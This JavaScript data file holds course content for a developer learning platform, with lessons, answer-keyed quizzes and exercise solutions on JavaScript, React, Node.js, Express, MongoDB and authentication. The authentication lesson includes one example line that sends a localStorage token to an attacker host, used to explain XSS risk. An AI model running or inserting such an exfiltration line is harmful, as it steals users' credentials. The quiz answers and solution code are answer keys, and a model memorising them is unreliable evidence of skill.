export const learningContent = [
  {
    topicKey: "javascript",
    lesson: {
      title: "JavaScript Runtime Internals, Closures & Async Architecture",
      estimatedTime: 25,
      videoURL: "https://www.youtube.com/embed/8aGhZQkoFbQ",
      content: `## 1. The V8 Engine & Execution Context
JavaScript is a single-threaded, non-blocking, asynchronous concurrent language. Understanding execution context creation is crucial for production debugging.

### Execution Context Lifecycle:
1. **Creation Phase**:
   - The global object (e.g. \`window\` or \`global\`) is set up.
   - Memory space is allocated for variables and functions (**Hoisting**).
   - Variables are initialized to \`undefined\` (or placed in the *Temporal Dead Zone* for \`let\` / \`const\`).
2. **Execution Phase**:
   - Code executes line by line.
   - Functions spawn new execution contexts placed on the **Call Stack**.

---

## 2. The Event Loop, Microtasks & Macrotasks
Because the Call Stack is single-threaded, asynchronous I/O is offloaded to the browser Web APIs or libuv thread pool.

\`\`\`
[ Call Stack ]  <--- Pops synchronously
      ^
      |
[ Microtask Queue ] (Promises, queueMicrotask, MutationObserver) -- HIGHER PRIORITY
      ^
      |
[ Macrotask Queue ] (setTimeout, setInterval, setImmediate, I/O) -- LOWER PRIORITY
\`\`\`

### Execution Priority Rule:
Whenever the call stack empties, the Event Loop **exhausts the entire Microtask Queue** before picking the single next task from the Macrotask Queue!

---

## 3. Closures & Memory Retention
A **closure** is the combination of a function bundled together with references to its lexical environment.
\`\`\`javascript
function createRateLimiter(maxCalls, timeWindowMs) {
  let calls = 0;
  let resetTime = Date.now() + timeWindowMs;

  return function executeCall(action) {
    const now = Date.now();
    if (now > resetTime) {
      calls = 0;
      resetTime = now + timeWindowMs;
    }
    if (calls >= maxCalls) {
      throw new Error("Rate limit exceeded. Try again later.");
    }
    calls++;
    return action();
  };
}
\`\`\`
*Architectural takeaway*: Closures retain memory of outer variables. Avoid leaking references to large DOM trees or buffers.`,
    },
    quiz: {
      title: "JavaScript Async & Runtime Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "Given the following snippet, what will be logged to the console in order?\n\nconsole.log(1);\nsetTimeout(() => console.log(2), 0);\nPromise.resolve().then(() => console.log(3));\nconsole.log(4);",
          type: "mcq",
          options: [
            "1, 2, 3, 4",
            "1, 4, 3, 2",
            "1, 4, 2, 3",
            "3, 1, 4, 2",
          ],
          correctAnswer: "1, 4, 3, 2",
          explanation: "Synchronous code (1, 4) executes first on the call stack. Then the microtask queue (Promise -> 3) is processed. Finally, the macrotask queue (setTimeout -> 2) executes.",
          points: 25,
        },
        {
          question: "What occurs when accessing a 'let' or 'const' variable prior to its declaration line?",
          type: "mcq",
          options: [
            "Returns undefined due to variable hoisting",
            "Throws a ReferenceError because the variable is in the Temporal Dead Zone (TDZ)",
            "Silently sets the variable to null",
            "Allocates memory dynamically in the global namespace",
          ],
          correctAnswer: "Throws a ReferenceError because the variable is in the Temporal Dead Zone (TDZ)",
          explanation: "'let' and 'const' variables are hoisted, but uninitialized. Attempting to read them before initialization triggers a ReferenceError due to the TDZ.",
          points: 25,
        },
        {
          question: "How does JavaScript garbage collection determine if an object's memory can be safely reclaimed?",
          type: "mcq",
          options: [
            "Reference Counting only (deletes when reference count reaches 0)",
            "Mark-and-Sweep algorithm: checks if the object is reachable from root references",
            "Automatic deletion after 60 seconds of inactivity",
            "When the function in which it was instantiated returns",
          ],
          correctAnswer: "Mark-and-Sweep algorithm: checks if the object is reachable from root references",
          explanation: "Modern engines (V8, SpiderMonkey) utilize Mark-and-Sweep tracing to detect reachability from global roots, preventing memory leaks from circular references.",
          points: 25,
        },
        {
          question: "What is the primary difference between Promise.all() and Promise.allSettled()?",
          type: "mcq",
          options: [
            "Promise.all() rejects immediately upon the first failure, whereas Promise.allSettled() waits for all promises regardless of rejections",
            "Promise.allSettled() runs in serial while Promise.all() runs in parallel",
            "Promise.all() can only accept arrays of primitives",
            "There is no difference; allSettled is an alias for backward compatibility",
          ],
          correctAnswer: "Promise.all() rejects immediately upon the first failure, whereas Promise.allSettled() waits for all promises regardless of rejections",
          explanation: "Promise.all fail-fasts on the first rejection. Promise.allSettled guarantees all promises complete and returns status objects for each.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Implement Async Retry with Exponential Backoff",
      description: "Write a function `retryWithBackoff(fn, retries, delay)` that calls async function `fn`. If `fn` throws, it retries up to `retries` times, doubling the delay each time (e.g. delay, delay*2, delay*4). If all attempts fail, it throws the last error.",
      difficulty: "medium",
      language: "javascript",
      templateCode: `async function retryWithBackoff(fn, retries = 3, delay = 100) {
  // Your implementation here
}`,
      solutionCode: `async function retryWithBackoff(fn, retries = 3, delay = 100) {
  let lastError;
  let currentDelay = delay;
  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      return await fn();
    } catch (err) {
      lastError = err;
      if (attempt < retries) {
        await new Promise((res) => setTimeout(res, currentDelay));
        currentDelay *= 2;
      }
    }
  }
  throw lastError;
}`,
      tests: [
        {
          input: "retryWithBackoff(() => Promise.resolve('SUCCESS'), 3, 50)",
          expectedOutput: "SUCCESS",
          description: "Should return immediately if fn succeeds on first attempt",
        },
        {
          input: "let count = 0; retryWithBackoff(() => { count++; if(count < 2) throw new Error('fail'); return 'RECOVERED'; }, 3, 20)",
          expectedOutput: "RECOVERED",
          description: "Should retry on failure and resolve when a subsequent attempt succeeds",
        },
      ],
    },
  },
  {
    topicKey: "react",
    lesson: {
      title: "React 19 Rendering Cycles, Custom Hooks & State Reconciliation",
      estimatedTime: 30,
      videoURL: "https://www.youtube.com/embed/dpw9EHDh2bM",
      content: `## 1. The Fiber Reconciler & Render Phase
React separates rendering into two phases:
1. **Render Phase**: Pure and has no side effects. React walks the Fiber tree, calls component functions, and diffs new Virtual DOM elements against previous fibers.
2. **Commit Phase**: Synchronous. React writes changes to the actual DOM and fires layout effects (\`useLayoutEffect\`), followed by passive effects (\`useEffect\`).

---

## 2. State Batching & Closures in Hooks
In React 18 & 19, **Automatic Batching** groups state updates together across promises, timeouts, and event handlers to prevent wasted re-renders.

\`\`\`javascript
// Always use functional state updater when new state depends on previous state!
setCount((prev) => prev + 1);
\`\`\`

---

## 3. Hook Dependency Rules & Stale Closures
When an effect or callback closes over a state variable without declaring it in the dependency array, it creates a **stale closure** bug.

\`\`\`javascript
// Bad: Stale count in interval
useEffect(() => {
  const timer = setInterval(() => {
    console.log(count); // Stale reference!
  }, 1000);
  return () => clearInterval(timer);
}, []); // Missing count dependency!
\`\`\``,
    },
    quiz: {
      title: "React Architecture & Performance Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "Why should you never mutate state directly in React (e.g. state.push(newItem))?",
          type: "mcq",
          options: [
            "React performs shallow reference equality checks (Object.is); mutating the same reference prevents re-rendering",
            "JavaScript will throw a syntax error",
            "Direct mutation deletes the browser memory cache",
            "It turns functional components into class components",
          ],
          correctAnswer: "React performs shallow reference equality checks (Object.is); mutating the same reference prevents re-rendering",
          explanation: "React relies on immutability. If the object reference doesn't change, React assumes nothing updated and skips the render cycle.",
          points: 25,
        },
        {
          question: "When should useMemo be applied?",
          type: "mcq",
          options: [
            "Wrap every single primitive variable in useMemo",
            "Only for computationally expensive calculations or to preserve referential stability for downstream React.memo components",
            "To replace Redux and global state",
            "Exclusively in asynchronous server components",
          ],
          correctAnswer: "Only for computationally expensive calculations or to preserve referential stability for downstream React.memo components",
          explanation: "useMemo incurs overhead (closure allocations and array comparisons). It should be reserved for expensive calculations or referential stability.",
          points: 25,
        },
        {
          question: "What is the key purpose of the 'key' prop in React lists?",
          type: "mcq",
          options: [
            "To style elements using CSS selectors",
            "To give elements stable identities across renders so the reconciler knows which items were added, moved, or deleted",
            "To enable server-side hydration logging",
            "To encrypt child component properties",
          ],
          correctAnswer: "To give elements stable identities across renders so the reconciler knows which items were added, moved, or deleted",
          explanation: "Keys provide stable identities for Fiber nodes, preventing full DOM node destruction and incorrect state preservation.",
          points: 25,
        },
        {
          question: "What happens during React 19 / 18 Automatic Batching?",
          type: "mcq",
          options: [
            "Multiple state updates inside async callbacks or timeouts are batched into a single render cycle",
            "Components are compiled to WebAssembly",
            "Effects run before the DOM commit phase",
            "HTTP requests are automatically cancelled",
          ],
          correctAnswer: "Multiple state updates inside async callbacks or timeouts are batched into a single render cycle",
          explanation: "Automatic batching unifies multiple setState triggers within async timeouts, promises, or fetch calls into one performant re-render.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Build a Debounced State Updater Function",
      description: "Implement a utility `createDebouncer(fn, waitMs)` that returns a debounced function. If invoked repeatedly within `waitMs`, it clears the previous timer and only executes `fn` after `waitMs` milliseconds of silence.",
      difficulty: "medium",
      language: "javascript",
      templateCode: `function createDebouncer(fn, waitMs) {
  // Your implementation here
}`,
      solutionCode: `function createDebouncer(fn, waitMs) {
  let timeoutId = null;
  return function (...args) {
    if (timeoutId) clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      fn.apply(this, args);
      timeoutId = null;
    }, waitMs);
  };
}`,
      tests: [
        {
          input: "let val = 0; const d = createDebouncer(() => val++, 30); d(); d(); d(); return new Promise(r => setTimeout(() => r(val), 80));",
          expectedOutput: "1",
          description: "Should coalesce three rapid calls into a single invocation",
        },
      ],
    },
  },
  {
    topicKey: "nodejs",
    lesson: {
      title: "Node.js Architecture: libuv, Streams, Buffers & Thread Pool",
      estimatedTime: 20,
      videoURL: "https://www.youtube.com/embed/PNa9OMajw9w",
      content: `## 1. Node.js System Architecture
Node.js pairs the **Google V8 engine** with the **libuv C library**:
- **V8 Engine**: Parses and compiles JavaScript into machine code.
- **libuv**: Implements the event loop, non-blocking asynchronous I/O, DNS resolution, and a default thread pool of 4 worker threads (\`UV_THREADPOOL_SIZE\`).

---

## 2. Streams vs Buffers
Reading an entire 1GB file with \`fs.readFile()\` loads the complete 1GB into memory buffer, which can cause high memory pressure and crashes.
With **Streams**, data is read chunk by chunk (typically 64KB per chunk):
\`\`\`javascript
import fs from "fs";
import zlib from "zlib";

// Pipe chunk by chunk without memory spikes
fs.createReadStream("huge.log")
  .pipe(zlib.createGzip())
  .pipe(fs.createWriteStream("huge.log.gz"));
\`\`\`

---

## 3. Handling Backpressure
When a fast readable stream pumps data faster than a slow writable stream can write, memory builds up. The \`.pipe()\` method automatically handles **backpressure** by pausing reading until the write buffer drains.`,
    },
    quiz: {
      title: "Node.js Core Architecture Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "Which of the following tasks are offloaded to the libuv thread pool rather than the OS asynchronous kernel?",
          type: "mcq",
          options: [
            "Network TCP socket connections",
            "File system operations (fs), crypto operations (e.g. bcrypt/pbkdf2), and DNS lookups",
            "Array sorting in JavaScript",
            "Console.log statements",
          ],
          correctAnswer: "File system operations (fs), crypto operations (e.g. bcrypt/pbkdf2), and DNS lookups",
          explanation: "Most OS kernels lack true non-blocking file I/O. libuv uses a background thread pool (default 4 threads) for file system, crypto, and DNS calls.",
          points: 25,
        },
        {
          question: "What is 'Backpressure' in Node.js streams?",
          type: "mcq",
          options: [
            "When the writable stream cannot consume data as fast as the readable stream produces it",
            "A memory error thrown when buffers exceed 2GB",
            "A security attack targeting HTTP POST payloads",
            "A network timeout caused by dropped TCP packets",
          ],
          correctAnswer: "When the writable stream cannot consume data as fast as the readable stream produces it",
          explanation: "Backpressure occurs when data builds up in memory because reading outpaces writing. Node streams manage this via pause/resume signals.",
          points: 25,
        },
        {
          question: "What is the difference between process.nextTick() and setImmediate()?",
          type: "mcq",
          options: [
            "process.nextTick() executes immediately after the current operation before the event loop continues, while setImmediate() executes in the Check phase of the event loop",
            "setImmediate() has higher priority than process.nextTick()",
            "setImmediate() only works in the browser",
            "There is no difference; they are identical",
          ],
          correctAnswer: "process.nextTick() executes immediately after the current operation before the event loop continues, while setImmediate() executes in the Check phase of the event loop",
          explanation: "process.nextTick() runs immediately prior to any other I/O or microtask. setImmediate() is queued for the check phase of the event loop cycle.",
          points: 25,
        },
        {
          question: "Why should synchronous functions like fs.readFileSync() never be used in production Express route handlers?",
          type: "mcq",
          options: [
            "They completely block the single-threaded event loop, preventing all concurrent requests from processing",
            "They delete database connections",
            "They are deprecated in ES6",
            "They only support binary files",
          ],
          correctAnswer: "They completely block the single-threaded event loop, preventing all concurrent requests from processing",
          explanation: "Because Node.js runs on a single main event loop thread, synchronous file operations freeze the entire server for all connected clients.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Parse and Sanitize Environment Variables",
      description: "Implement a utility `validateEnv(envObject, requiredKeys)` that checks if all `requiredKeys` exist and are non-empty strings. If all are present, return an object containing only the required keys. If any is missing or empty, throw an Error with the missing key name.",
      difficulty: "easy",
      language: "javascript",
      templateCode: `function validateEnv(env, requiredKeys) {
  // Your code here
}`,
      solutionCode: `function validateEnv(env, requiredKeys) {
  const result = {};
  for (const key of requiredKeys) {
    const val = env[key];
    if (val === undefined || val === null || String(val).trim() === '') {
      throw new Error('Missing environment variable: ' + key);
    }
    result[key] = String(val).trim();
  }
  return result;
}`,
      tests: [
        {
          input: "validateEnv({ PORT: '5000', DB_URI: 'mongodb://localhost' }, ['PORT', 'DB_URI'])",
          expectedOutput: "{\"PORT\":\"5000\",\"DB_URI\":\"mongodb://localhost\"}",
          description: "Should validate and extract all required environment variables",
        },
      ],
    },
  },
  {
    topicKey: "express",
    lesson: {
      title: "Express.js Clean Architecture: Middleware, Services & Error Handling",
      estimatedTime: 20,
      videoURL: "https://www.youtube.com/embed/lY6icfhap2o",
      content: `## 1. The Controller-Service-Repository Pattern
To build maintainable, testable APIs, never mix HTTP concerns with business logic:
- **Routes**: Declare HTTP methods, paths, and middleware chains.
- **Middleware**: Authentication, rate limiting, and request validation (e.g. Zod).
- **Controllers**: Extract \`req.body\` / \`req.params\`, call services, return HTTP status.
- **Services**: Pure business logic (token generation, domain rules, calculations).
- **Models**: Database schemas, queries, and indexes.

---

## 2. Centralized Error Handling Middleware
Express recognizes an error-handling middleware **only** if it accepts exactly 4 arguments:
\`\`\`javascript
app.use((err, req, res, next) => {
  const statusCode = err.statusCode || 500;
  res.status(statusCode).json({
    success: false,
    message: err.message || "Internal Server Error",
    ...(process.env.NODE_ENV === "development" && { stack: err.stack }),
  });
});
\`\`\`
*Rule*: Mount the error-handling middleware **after all route definitions**!`,
    },
    quiz: {
      title: "Express Clean Architecture Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "How does Express distinguish an error-handling middleware from a standard middleware?",
          type: "mcq",
          options: [
            "By checking function.length === 4: it must accept (err, req, res, next)",
            "By checking if the function returns a Promise.reject()",
            "By naming the function 'errorHandler'",
            "By registering it with app.error() instead of app.use()",
          ],
          correctAnswer: "By checking function.length === 4: it must accept (err, req, res, next)",
          explanation: "Express inspects the arity (function.length) of the middleware. Exactly 4 parameters indicates it is an error-handling middleware.",
          points: 25,
        },
        {
          question: "Why should literal routes (e.g. /my-roadmap) be declared before parameterized routes (e.g. /:roadmapId)?",
          type: "mcq",
          options: [
            "Express matches routes in the order they are defined; /:roadmapId will greedily capture 'my-roadmap' as a parameter",
            "Express crashes if parameterized routes appear after literal routes",
            "Literal routes require more RAM",
            "Parameterized routes only accept integers",
          ],
          correctAnswer: "Express matches routes in the order they are defined; /:roadmapId will greedily capture 'my-roadmap' as a parameter",
          explanation: "Express evaluates routes sequentially. A parameterized route will capture any string at that segment unless a literal route matches first.",
          points: 25,
        },
        {
          question: "In Express 4/5, how should asynchronous errors in route handlers be forwarded to the error middleware?",
          type: "mcq",
          options: [
            "By catching errors in a try/catch block and invoking next(error)",
            "By throwing a raw string",
            "By calling process.exit(1)",
            "By returning res.send(error)",
          ],
          correctAnswer: "By catching errors in a try/catch block and invoking next(error)",
          explanation: "Passing any argument to next(arg) instructs Express that an error occurred, bypassing all regular route handlers to jump directly to the 4-arg error middleware.",
          points: 25,
        },
        {
          question: "What is the primary benefit of decoupling controllers from services?",
          type: "mcq",
          options: [
            "Business logic in services can be unit tested without mocking Express req and res objects",
            "It doubles the network speed of the API",
            "It automatically configures SSL certificates",
            "It bypasses CORS restrictions",
          ],
          correctAnswer: "Business logic in services can be unit tested without mocking Express req and res objects",
          explanation: "Decoupling services from req/res allows business logic to be tested independently, reused in CLI scripts or queues, and maintained cleanly.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Build an API Response Formatter",
      description: "Implement a utility `formatApiResponse(success, data, message, statusCode)` that returns a standardized JSON response object `{ success, statusCode, message, data, timestamp }` where timestamp is an ISO 8601 string.",
      difficulty: "easy",
      language: "javascript",
      templateCode: `function formatApiResponse(success, data = null, message = "", statusCode = 200) {
  // Your code here
}`,
      solutionCode: `function formatApiResponse(success, data = null, message = "", statusCode = 200) {
  return {
    success: Boolean(success),
    statusCode: Number(statusCode),
    message: String(message),
    data: data,
    timestamp: new Date().toISOString(),
  };
}`,
      tests: [
        {
          input: "const r = formatApiResponse(true, { user: 'Alice' }, 'OK', 200); return [r.success, r.statusCode, r.data.user, typeof r.timestamp].join(',');",
          expectedOutput: "true,200,Alice,string",
          description: "Should return a consistent API payload structure",
        },
      ],
    },
  },
  {
    topicKey: "mongodb",
    lesson: {
      title: "MongoDB & Mongoose: Indexing, Aggregations & Query Performance",
      estimatedTime: 25,
      videoURL: "https://www.youtube.com/embed/ofme2o29ngU",
      content: `## 1. Document Indexing Strategies
Without indexes, MongoDB must perform a **Collection Scan (COLLSCAN)**, reading every single document from disk.
- **Single Field Index**: \`schema.index({ email: 1 })\`
- **Compound Index**: \`schema.index({ user: 1, createdAt: -1 })\` (Order matters! The **Equality, Sort, Range** rule).

---

## 2. The Aggregation Pipeline
Aggregation processes documents through a multi-stage data pipeline:
\`\`\`javascript
const stats = await UserRoadmap.aggregate([
  { $match: { user: new mongoose.Types.ObjectId(userId) } },
  { $unwind: "$progress" },
  {
    $group: {
      _id: "$progress.status",
      count: { $sum: 1 },
      avgProgress: { $avg: "$progress.progressPercent" },
    },
  },
]);
\`\`\`

---

## 3. Embedding vs Referencing
- **Embed** (1-to-Few): When child data is always read with the parent (e.g. milestones in a roadmap).
- **Reference** (1-to-Many): When data grows unboundedly (e.g. Activity audit logs) to avoid hitting MongoDB's 16MB document limit.`,
    },
    quiz: {
      title: "MongoDB Indexing & Aggregations Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "What is the maximum BSON document size limit in MongoDB?",
          type: "mcq",
          options: [
            "16 Megabytes",
            "64 Megabytes",
            "1 Gigabyte",
            "Unlimited",
          ],
          correctAnswer: "16 Megabytes",
          explanation: "MongoDB enforces a strict 16MB maximum document size to ensure RAM efficiency and prevent massive nested trees from slowing down queries.",
          points: 25,
        },
        {
          question: "In compound indexes, what is the 'Equality, Sort, Range' (ESR) rule?",
          type: "mcq",
          options: [
            "Index fields used in exact matches (equality) should come first, followed by sort fields, followed by range filters",
            "Range filters must always come first",
            "Sort order should be random",
            "All fields must be indexed separately",
          ],
          correctAnswer: "Index fields used in exact matches (equality) should come first, followed by sort fields, followed by range filters",
          explanation: "The ESR rule optimizes compound indexes: Equality fields narrow the search set, Sort fields avoid in-memory sorting, and Range filters filter the scan boundary.",
          points: 25,
        },
        {
          question: "Which aggregation pipeline stage is used to deconstruct an array field into individual documents?",
          type: "mcq",
          options: [
            "$unwind",
            "$lookup",
            "$project",
            "$facet",
          ],
          correctAnswer: "$unwind",
          explanation: "$unwind outputs a new document for each element in the specified array field.",
          points: 25,
        },
        {
          question: "Why should you avoid unbounded array growth inside a single document?",
          type: "mcq",
          options: [
            "It will eventually exceed the 16MB limit and cause write errors",
            "Arrays are not supported in BSON",
            "MongoDB does not allow updating arrays",
            "It disables replica set syncing",
          ],
          correctAnswer: "It will eventually exceed the 16MB limit and cause write errors",
          explanation: "Unbounded arrays (e.g. infinite activity logs in a user document) cause document growth, frequent page allocations, and eventually crash at the 16MB ceiling.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Calculate Average Scores from Attempts",
      description: "Implement a function `calculateMasteryRate(attempts)` that accepts an array of attempt objects `[{ score: number, passed: boolean }]` and returns `{ totalAttempts, passedAttempts, passRate, averageScore }` where passRate and averageScore are rounded to 1 decimal place.",
      difficulty: "easy",
      language: "javascript",
      templateCode: `function calculateMasteryRate(attempts) {
  // Your code here
}`,
      solutionCode: `function calculateMasteryRate(attempts) {
  if (!attempts || attempts.length === 0) {
    return { totalAttempts: 0, passedAttempts: 0, passRate: 0, averageScore: 0 };
  }
  const total = attempts.length;
  const passed = attempts.filter(a => a.passed).length;
  const sum = attempts.reduce((acc, a) => acc + (a.score || 0), 0);
  return {
    totalAttempts: total,
    passedAttempts: passed,
    passRate: Number(((passed / total) * 100).toFixed(1)),
    averageScore: Number((sum / total).toFixed(1)),
  };
}`,
      tests: [
        {
          input: "calculateMasteryRate([{ score: 80, passed: true }, { score: 90, passed: true }, { score: 50, passed: false }])",
          expectedOutput: "{\"totalAttempts\":3,\"passedAttempts\":2,\"passRate\":66.7,\"averageScore\":73.3}",
          description: "Should compute accurate pass rates and average scores",
        },
      ],
    },
  },
  {
    topicKey: "authentication",
    lesson: {
      title: "Production Authentication: JWT Rotation, HttpOnly Cookies & Anti-Cheat Security",
      estimatedTime: 25,
      videoURL: "https://www.youtube.com/embed/mbsmsi7l3r4",
      content: `## 1. The Vulnerability of LocalStorage for Tokens
Storing JWT access or refresh tokens in \`localStorage\` is vulnerable to **Cross-Site Scripting (XSS)**. Any malicious script or compromised npm package can execute:
\`\`\`javascript
fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));
\`\`\`

---

## 2. HttpOnly SameSite Cookies
Delivering tokens via HTTP headers using **HttpOnly cookies** completely blocks browser JavaScript from reading the token:
- **HttpOnly**: JavaScript cannot read \`document.cookie\`.
- **Secure**: Transmitted strictly over HTTPS in production.
- **SameSite=Strict / Lax**: Mitigates Cross-Site Request Forgery (CSRF).

---

## 3. Short-Lived Access Token + Refresh Token Rotation
- **Access Token**: Short lifespan (e.g. 15 minutes). Sent with API requests.
- **Refresh Token**: Longer lifespan (e.g. 7 days). Stored securely in a session record.
- **Rotation**: Every time the refresh token is used, it is revoked and a new refresh token is issued. If a revoked refresh token is ever presented, the server revokes the entire user session family to defend against token theft!`,
    },
    quiz: {
      title: "Authentication & Security Architecture Mastery Assessment",
      passingScore: 80,
      questions: [
        {
          question: "Why are HttpOnly cookies superior to LocalStorage for storing sensitive JWT authentication tokens?",
          type: "mcq",
          options: [
            "HttpOnly cookies cannot be accessed or stolen by JavaScript code in the event of an XSS vulnerability",
            "HttpOnly cookies can store up to 500 Megabytes",
            "HttpOnly cookies automatically encrypt the server database",
            "HttpOnly cookies do not expire",
          ],
          correctAnswer: "HttpOnly cookies cannot be accessed or stolen by JavaScript code in the event of an XSS vulnerability",
          explanation: "The HttpOnly flag forbids JavaScript from reading document.cookie, making stolen token exfiltration via client-side XSS impossible.",
          points: 25,
        },
        {
          question: "What is Refresh Token Rotation?",
          type: "mcq",
          options: [
            "Issuing a brand new refresh token every time the old refresh token is exchanged for an access token, revoking the previous one",
            "Rotating password hashes every 24 hours",
            "Swapping private and public keys periodically",
            "Restarting the Express server on every request",
          ],
          correctAnswer: "Issuing a brand new refresh token every time the old refresh token is exchanged for an access token, revoking the previous one",
          explanation: "Refresh token rotation ensures each refresh token is single-use. If a previously used token is detected again, the entire session family is revoked as a breach indicator.",
          points: 25,
        },
        {
          question: "What is the role of bcrypt 'salt rounds' in password hashing?",
          type: "mcq",
          options: [
            "It introduces computational work to slow down brute-force and rainbow table attacks exponentially",
            "It generates a public SSL certificate",
            "It validates email address syntax",
            "It caches user avatars in Redis",
          ],
          correctAnswer: "It introduces computational work to slow down brute-force and rainbow table attacks exponentially",
          explanation: "Bcrypt salt rounds dictate the cost factor: 2^rounds iterations. This makes offline dictionary and GPU attacks computationally prohibitive.",
          points: 25,
        },
        {
          question: "What does the SameSite=Strict cookie attribute prevent?",
          type: "mcq",
          options: [
            "Cross-Site Request Forgery (CSRF) by preventing the cookie from being sent on cross-site requests",
            "SQL injection in query parameters",
            "DDoS attacks on the network layer",
            "Memory leaks in Node.js event listeners",
          ],
          correctAnswer: "Cross-Site Request Forgery (CSRF) by preventing the cookie from being sent on cross-site requests",
          explanation: "SameSite=Strict ensures the browser never sends the cookie on requests originating from third-party websites, neutralizing CSRF attacks.",
          points: 25,
        },
      ],
    },
    exercise: {
      title: "Implement a Role-Based Access Guard",
      description: "Implement a helper `hasRequiredRole(userRole, allowedRoles)` that returns `true` if `userRole` is in the `allowedRoles` array, or if `userRole` is 'admin'. Otherwise return `false`.",
      difficulty: "easy",
      language: "javascript",
      templateCode: `function hasRequiredRole(userRole, allowedRoles) {
  // Your code here
}`,
      solutionCode: `function hasRequiredRole(userRole, allowedRoles) {
  if (!userRole) return false;
  if (userRole === 'admin') return true;
  return Array.isArray(allowedRoles) && allowedRoles.includes(userRole);
}`,
      tests: [
        {
          input: "[hasRequiredRole('admin', ['user']), hasRequiredRole('student', ['mentor', 'student']), hasRequiredRole('guest', ['mentor'])].join(',')",
          expectedOutput: "true,true,false",
          description: "Should grant access to admin and authorized roles, denying unauthorized",
        },
      ],
    },
  },
];
